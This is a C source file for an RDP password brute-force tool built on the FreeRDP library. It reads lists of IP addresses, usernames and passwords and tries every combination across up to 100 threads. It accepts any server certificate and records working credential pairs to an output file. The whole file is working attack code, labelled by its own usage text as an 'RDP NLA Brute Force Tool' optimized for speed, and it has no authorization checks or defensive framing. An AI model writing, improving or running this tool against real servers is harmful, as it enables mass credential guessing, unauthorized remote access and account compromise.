#include <freerdp/freerdp.h>
#include <freerdp/settings.h>
#include <freerdp/client.h>
#include <freerdp/error.h>
#include <freerdp/log.h>

#include <winpr/crt.h>
#include <winpr/synch.h>
#include <winpr/thread.h>
#include <winpr/file.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <sys/time.h>

#define MAX_LINE_LENGTH 256
#define MAX_THREADS 100
#define DEFAULT_THREADS 20
#define CONNECTION_TIMEOUT 5000  // 5 seconds
#define AUTH_TIMEOUT 3000       // 3 seconds
#define MAX_TARGETS 100000
#define MAX_USERS 10000
#define MAX_PASSWORDS 100000

// Global configuration
struct config {
    char **ips;
    char **users;
    char **passwords;
    int ip_count;
    int user_count;
    int password_count;
    int thread_count;
    char *output_file;
    int port;
    int verbose;
    int use_ssl;
    int use_nla;
};

// Thread data structure
struct thread_data {
    int thread_id;
    struct config *cfg;
    FILE *output_fp;
    pthread_mutex_t *output_mutex;
    pthread_mutex_t *stats_mutex;
    int *current_index;
    int *attempts;
    int *successful;
    int *failed;
    volatile int *stop_flag;
};

// Result structure
struct result {
    char ip[64];
    char username[128];
    char password[128];
    char domain[128];
    int port;
    int success;
    double response_time;
    char error_msg[256];
};

// Global stats
static volatile int g_total_attempts = 0;
static volatile int g_successful = 0;
static volatile int g_failed = 0;
static volatile int g_stop_flag = 0;
static time_t g_start_time;

// FreeRDP context structure
struct rdp_context {
    freerdp *instance;
    char target_ip[64];
    char target_user[128];
    char target_pass[128];
    char target_domain[128];
    int target_port;
    int connection_result;
    double response_time;
    char error_message[256];
    struct timeval start_time;
    volatile int completed;
};

// Signal handler
void signal_handler(int sig) {
    printf("\n[!] Received signal %d, stopping...\n", sig);
    g_stop_flag = 1;
}

// Utility functions
double get_time_diff(struct timeval *start, struct timeval *end) {
    return (end->tv_sec - start->tv_sec) + (end->tv_usec - start->tv_usec) / 1000000.0;
}

void print_stats() {
    time_t current_time = time(NULL);
    double elapsed = difftime(current_time, g_start_time);
    double rate = (elapsed > 0) ? g_total_attempts / elapsed : 0;
    
    printf("\r[*] Attempts: %d | Success: %d | Failed: %d | Rate: %.2f/s", 
           g_total_attempts, g_successful, g_failed, rate);
    fflush(stdout);
}

// FreeRDP Callbacks
static BOOL rdp_pre_connect(freerdp *instance) {
    return TRUE;
}

static BOOL rdp_post_connect(freerdp *instance) {
    return TRUE;
}

static void rdp_post_disconnect(freerdp *instance) {
    // Connection cleanup
}

static BOOL rdp_authenticate(freerdp *instance, char **username, char **password, char **domain) {
    struct rdp_context *ctx = (struct rdp_context *)instance->context;
    
    // Return the credentials we want to test
    *username = _strdup(ctx->target_user);
    *password = _strdup(ctx->target_pass);
    *domain = _strdup(ctx->target_domain);
    
    return TRUE;
}

static BOOL rdp_verify_certificate(freerdp *instance, const char *common_name, 
                                   const char *subject, const char *issuer, 
                                   const char *fingerprint, BOOL host_mismatch) {
    // Accept all certificates for brute force
    return TRUE;
}

static DWORD rdp_verify_certificate_ex(freerdp *instance, const char *host, UINT16 port,
                                       const char *common_name, const char *subject,
                                       const char *issuer, const char *fingerprint, DWORD flags) {
    // Accept all certificates
    return 1;
}

// Optimized RDP connection attempt
int attempt_rdp_connection(const char *ip, int port, const char *username, 
                          const char *password, const char *domain, 
                          struct result *result) {
    
    freerdp *instance = NULL;
    rdpSettings *settings = NULL;
    struct rdp_context ctx = {0};
    int ret = 0;
    
    gettimeofday(&ctx.start_time, NULL);
    
    // Initialize result
    strncpy(result->ip, ip, sizeof(result->ip) - 1);
    strncpy(result->username, username, sizeof(result->username) - 1);
    strncpy(result->password, password, sizeof(result->password) - 1);
    strncpy(result->domain, domain, sizeof(result->domain) - 1);
    result->port = port;
    result->success = 0;
    result->response_time = 0.0;
    result->error_msg[0] = '\0';
    
    // Create FreeRDP instance
    instance = freerdp_new();
    if (!instance) {
        strcpy(result->error_msg, "Failed to create FreeRDP instance");
        return -1;
    }
    
    // Configure context
    instance->ContextSize = sizeof(struct rdp_context);
    if (!freerdp_context_new(instance)) {
        strcpy(result->error_msg, "Failed to create context");
        freerdp_free(instance);
        return -1;
    }
    
    ctx.instance = instance;
    strncpy(ctx.target_ip, ip, sizeof(ctx.target_ip) - 1);
    strncpy(ctx.target_user, username, sizeof(ctx.target_user) - 1);
    strncpy(ctx.target_pass, password, sizeof(ctx.target_pass) - 1);
    strncpy(ctx.target_domain, domain, sizeof(ctx.target_domain) - 1);
    ctx.target_port = port;
    
    // Copy context to instance
    memcpy(instance->context, &ctx, sizeof(struct rdp_context));
    
    // Get settings
    settings = instance->context->settings;
    
    // Configure connection settings for speed
    freerdp_settings_set_string(settings, FreeRDP_ServerHostname, ip);
    freerdp_settings_set_uint32(settings, FreeRDP_ServerPort, port);
    freerdp_settings_set_uint32(settings, FreeRDP_TcpConnectTimeout, CONNECTION_TIMEOUT);
    freerdp_settings_set_uint32(settings, FreeRDP_TcpAckTimeout, AUTH_TIMEOUT);
    
    // Authentication settings
    freerdp_settings_set_string(settings, FreeRDP_Username, username);
    freerdp_settings_set_string(settings, FreeRDP_Password, password);
    freerdp_settings_set_string(settings, FreeRDP_Domain, domain);
    
    // Security settings - Enable NLA
    freerdp_settings_set_bool(settings, FreeRDP_NlaSecurity, TRUE);
    freerdp_settings_set_bool(settings, FreeRDP_TlsSecurity, TRUE);
    freerdp_settings_set_bool(settings, FreeRDP_RdpSecurity, FALSE);
    
    // Disable unnecessary features for speed
    freerdp_settings_set_bool(settings, FreeRDP_AudioPlayback, FALSE);
    freerdp_settings_set_bool(settings, FreeRDP_AudioCapture, FALSE);
    freerdp_settings_set_bool(settings, FreeRDP_RedirectClipboard, FALSE);
    freerdp_settings_set_bool(settings, FreeRDP_RedirectDrives, FALSE);
    freerdp_settings_set_bool(settings, FreeRDP_RedirectPrinters, FALSE);
    freerdp_settings_set_bool(settings, FreeRDP_RedirectSmartCards, FALSE);
    freerdp_settings_set_bool(settings, FreeRDP_RedirectSerialPorts, FALSE);
    freerdp_settings_set_bool(settings, FreeRDP_RedirectParallelPorts, FALSE);
    
    // Minimal display settings
    freerdp_settings_set_uint32(settings, FreeRDP_DesktopWidth, 640);
    freerdp_settings_set_uint32(settings, FreeRDP_DesktopHeight, 480);
    freerdp_settings_set_uint32(settings, FreeRDP_ColorDepth, 16);
    
    // Performance settings
    freerdp_settings_set_uint32(settings, FreeRDP_ConnectionType, CONNECTION_TYPE_LAN);
    freerdp_settings_set_bool(settings, FreeRDP_CompressionEnabled, FALSE);
    freerdp_settings_set_bool(settings, FreeRDP_BitmapCacheEnabled, FALSE);
    
    // Set callbacks
    instance->PreConnect = rdp_pre_connect;
    instance->PostConnect = rdp_post_connect;
    instance->PostDisconnect = rdp_post_disconnect;
    instance->Authenticate = rdp_authenticate;
    instance->VerifyX509Certificate = NULL;
    
    // Attempt connection
    if (freerdp_connect(instance)) {
        struct timeval end_time;
        gettimeofday(&end_time, NULL);
        result->response_time = get_time_diff(&ctx.start_time, &end_time);
        result->success = 1;
        ret = 1;
        
        // Immediate disconnect to save resources
        freerdp_disconnect(instance);
    } else {
        struct timeval end_time;
        gettimeofday(&end_time, NULL);
        result->response_time = get_time_diff(&ctx.start_time, &end_time);
        
        UINT32 error = freerdp_get_last_error(instance->context);
        const char *error_string = freerdp_get_last_error_string(error);
        
        if (error_string) {
            strncpy(result->error_msg, error_string, sizeof(result->error_msg) - 1);
        } else {
            strcpy(result->error_msg, "Connection failed");
        }
        
        ret = 0;
    }
    
    // Cleanup
    freerdp_context_free(instance);
    freerdp_free(instance);
    
    return ret;
}

// Worker thread function
void *worker_thread(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    struct result result;
    int local_index;
    
    while (!g_stop_flag && !*(data->stop_flag)) {
        // Get next work item
        pthread_mutex_lock(data->stats_mutex);
        local_index = (*(data->current_index))++;
        pthread_mutex_unlock(data->stats_mutex);
        
        // Calculate coordinates in the 3D space (ip, user, password)
        int total_combinations = data->cfg->ip_count * data->cfg->user_count * data->cfg->password_count;
        
        if (local_index >= total_combinations) {
            break; // All work done
        }
        
        int ip_idx = local_index / (data->cfg->user_count * data->cfg->password_count);
        int remaining = local_index % (data->cfg->user_count * data->cfg->password_count);
        int user_idx = remaining / data->cfg->password_count;
        int pass_idx = remaining % data->cfg->password_count;
        
        // Attempt connection
        char domain[64] = "";  // Empty domain by default
        int success = attempt_rdp_connection(
            data->cfg->ips[ip_idx],
            data->cfg->port,
            data->cfg->users[user_idx],
            data->cfg->passwords[pass_idx],
            domain,
            &result
        );
        
        // Update stats
        pthread_mutex_lock(data->stats_mutex);
        (*(data->attempts))++;
        g_total_attempts++;
        if (success) {
            (*(data->successful))++;
            g_successful++;
        } else {
            (*(data->failed))++;
            g_failed++;
        }
        pthread_mutex_unlock(data->stats_mutex);
        
        // Write result
        pthread_mutex_lock(data->output_mutex);
        if (result.success) {
            fprintf(data->output_fp, "[SUCCESS] %s:%d - %s:%s (%.3fs)\n",
                   result.ip, result.port, result.username, result.password, result.response_time);
            printf("\n[+] SUCCESS: %s:%d - %s:%s (%.3fs)\n",
                   result.ip, result.port, result.username, result.password, result.response_time);
        } else if (data->cfg->verbose) {
            fprintf(data->output_fp, "[FAILED] %s:%d - %s:%s - %s (%.3fs)\n",
                   result.ip, result.port, result.username, result.password, 
                   result.error_msg, result.response_time);
        }
        fflush(data->output_fp);
        pthread_mutex_unlock(data->output_mutex);
        
        // Print stats periodically
        if (g_total_attempts % 100 == 0) {
            print_stats();
        }
    }
    
    return NULL;
}

// Load file into array
int load_file_to_array(const char *filename, char ***array, int max_items) {
    FILE *fp = fopen(filename, "r");
    if (!fp) {
        printf("[-] Error: Cannot open file %s\n", filename);
        return -1;
    }
    
    *array = malloc(max_items * sizeof(char*));
    if (!*array) {
        printf("[-] Error: Memory allocation failed\n");
        fclose(fp);
        return -1;
    }
    
    char line[MAX_LINE_LENGTH];
    int count = 0;
    
    while (fgets(line, sizeof(line), fp) && count < max_items) {
        // Remove newline
        line[strcspn(line, "\r\n")] = 0;
        
        // Skip empty lines
        if (strlen(line) == 0) continue;
        
        (*array)[count] = malloc(strlen(line) + 1);
        if (!(*array)[count]) {
            printf("[-] Error: Memory allocation failed\n");
            break;
        }
        
        strcpy((*array)[count], line);
        count++;
    }
    
    fclose(fp);
    return count;
}

// Free array
void free_array(char **array, int count) {
    if (array) {
        for (int i = 0; i < count; i++) {
            if (array[i]) free(array[i]);
        }
        free(array);
    }
}

// Usage information
void usage(const char *program) {
    printf("RDP NLA Brute Force Tool v1.0\n");
    printf("Optimized for maximum speed using FreeRDP library\n\n");
    printf("Usage: %s [options]\n\n", program);
    printf("Required:\n");
    printf("  -i <file>     IP addresses file (one per line)\n");
    printf("  -u <file>     Usernames file (one per line)\n");
    printf("  -p <file>     Passwords file (one per line)\n");
    printf("  -o <file>     Output results file\n\n");
    printf("Optional:\n");
    printf("  -t <num>      Number of threads (default: %d, max: %d)\n", DEFAULT_THREADS, MAX_THREADS);
    printf("  -P <port>     RDP port (default: 3389)\n");
    printf("  -v            Verbose output (show failed attempts)\n");
    printf("  -h            Show this help\n\n");
    printf("Examples:\n");
    printf("  %s -i ips.txt -u users.txt -p passwords.txt -o results.txt\n", program);
    printf("  %s -i ips.txt -u users.txt -p passwords.txt -o results.txt -t 50 -v\n", program);
}

int main(int argc, char *argv[]) {
    struct config cfg = {0};
    FILE *output_fp = NULL;
    pthread_t *threads = NULL;
    struct thread_data *thread_data = NULL;
    pthread_mutex_t output_mutex = PTHREAD_MUTEX_INITIALIZER;
    pthread_mutex_t stats_mutex = PTHREAD_MUTEX_INITIALIZER;
    int current_index = 0;
    int attempts = 0, successful = 0, failed = 0;
    int opt;
    
    // Default values
    cfg.thread_count = DEFAULT_THREADS;
    cfg.port = 3389;
    cfg.verbose = 0;
    
    // Parse command line arguments
    while ((opt = getopt(argc, argv, "i:u:p:o:t:P:vh")) != -1) {
        switch (opt) {
            case 'i':
                cfg.ip_count = load_file_to_array(optarg, &cfg.ips, MAX_TARGETS);
                if (cfg.ip_count <= 0) {
                    printf("[-] Error loading IP addresses from %s\n", optarg);
                    return 1;
                }
                printf("[+] Loaded %d IP addresses\n", cfg.ip_count);
                break;
            case 'u':
                cfg.user_count = load_file_to_array(optarg, &cfg.users, MAX_USERS);
                if (cfg.user_count <= 0) {
                    printf("[-] Error loading usernames from %s\n", optarg);
                    return 1;
                }
                printf("[+] Loaded %d usernames\n", cfg.user_count);
                break;
            case 'p':
                cfg.password_count = load_file_to_array(optarg, &cfg.passwords, MAX_PASSWORDS);
                if (cfg.password_count <= 0) {
                    printf("[-] Error loading passwords from %s\n", optarg);
                    return 1;
                }
                printf("[+] Loaded %d passwords\n", cfg.password_count);
                break;
            case 'o':
                cfg.output_file = strdup(optarg);
                break;
            case 't':
                cfg.thread_count = atoi(optarg);
                if (cfg.thread_count <= 0 || cfg.thread_count > MAX_THREADS) {
                    printf("[-] Invalid thread count. Must be 1-%d\n", MAX_THREADS);
                    return 1;
                }
                break;
            case 'P':
                cfg.port = atoi(optarg);
                if (cfg.port <= 0 || cfg.port > 65535) {
                    printf("[-] Invalid port number\n");
                    return 1;
                }
                break;
            case 'v':
                cfg.verbose = 1;
                break;
            case 'h':
            default:
                usage(argv[0]);
                return 1;
        }
    }
    
    // Validate required arguments
    if (!cfg.ips || !cfg.users || !cfg.passwords || !cfg.output_file) {
        printf("[-] Error: Missing required arguments\n");
        usage(argv[0]);
        return 1;
    }
    
    // Open output file
    output_fp = fopen(cfg.output_file, "w");
    if (!output_fp) {
        printf("[-] Error: Cannot create output file %s\n", cfg.output_file);
        return 1;
    }
    
    // Calculate total combinations
    long long total_combinations = (long long)cfg.ip_count * cfg.user_count * cfg.password_count;
    
    printf("\n[*] RDP NLA Brute Force Tool Starting\n");
    printf("[*] Targets: %d IPs, %d users, %d passwords\n", cfg.ip_count, cfg.user_count, cfg.password_count);
    printf("[*] Total combinations: %lld\n", total_combinations);
    printf("[*] Threads: %d\n", cfg.thread_count);
    printf("[*] Port: %d\n", cfg.port);
    printf("[*] Output: %s\n", cfg.output_file);
    printf("[*] Connection timeout: %dms\n", CONNECTION_TIMEOUT);
    printf("[*] Auth timeout: %dms\n", AUTH_TIMEOUT);
    
    // Setup signal handlers
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    // Initialize FreeRDP logging (minimize output)
    wLog* root = WLog_GetRoot();
    WLog_SetLevel(root, WLOG_ERROR);
    
    // Start timing
    g_start_time = time(NULL);
    
    // Create threads
    threads = malloc(cfg.thread_count * sizeof(pthread_t));
    thread_data = malloc(cfg.thread_count * sizeof(struct thread_data));
    
    if (!threads || !thread_data) {
        printf("[-] Error: Memory allocation failed\n");
        return 1;
    }
    
    printf("\n[*] Starting brute force attack...\n");
    
    // Create worker threads
    for (int i = 0; i < cfg.thread_count; i++) {
        thread_data[i].thread_id = i;
        thread_data[i].cfg = &cfg;
        thread_data[i].output_fp = output_fp;
        thread_data[i].output_mutex = &output_mutex;
        thread_data[i].stats_mutex = &stats_mutex;
        thread_data[i].current_index = &current_index;
        thread_data[i].attempts = &attempts;
        thread_data[i].successful = &successful;
        thread_data[i].failed = &failed;
        thread_data[i].stop_flag = &g_stop_flag;
        
        if (pthread_create(&threads[i], NULL, worker_thread, &thread_data[i]) != 0) {
            printf("[-] Error: Failed to create thread %d\n", i);
            return 1;
        }
    }
    
    // Wait for threads to complete
    for (int i = 0; i < cfg.thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    // Final statistics
    time_t end_time = time(NULL);
    double total_time = difftime(end_time, g_start_time);
    double rate = (total_time > 0) ? g_total_attempts / total_time : 0;
    
    printf("\n\n[*] Brute force attack completed!\n");
    printf("[*] Total time: %.2f seconds\n", total_time);
    printf("[*] Total attempts: %d\n", g_total_attempts);
    printf("[*] Successful: %d\n", g_successful);
    printf("[*] Failed: %d\n", g_failed);
    printf("[*] Average rate: %.2f attempts/second\n", rate);
    printf("[*] Results saved to: %s\n", cfg.output_file);
    
    // Write summary to output file
    fprintf(output_fp, "\n# Summary\n");
    fprintf(output_fp, "# Total time: %.2f seconds\n", total_time);
    fprintf(output_fp, "# Total attempts: %d\n", g_total_attempts);
    fprintf(output_fp, "# Successful: %d\n", g_successful);
    fprintf(output_fp, "# Failed: %d\n", g_failed);
    fprintf(output_fp, "# Average rate: %.2f attempts/second\n", rate);
    
    // Cleanup
    if (output_fp) fclose(output_fp);
    if (threads) free(threads);
    if (thread_data) free(thread_data);
    if (cfg.output_file) free(cfg.output_file);
    
    free_array(cfg.ips, cfg.ip_count);
    free_array(cfg.users, cfg.user_count);
    free_array(cfg.passwords, cfg.password_count);
    
    pthread_mutex_destroy(&output_mutex);
    pthread_mutex_destroy(&stats_mutex);
    
    return 0;
}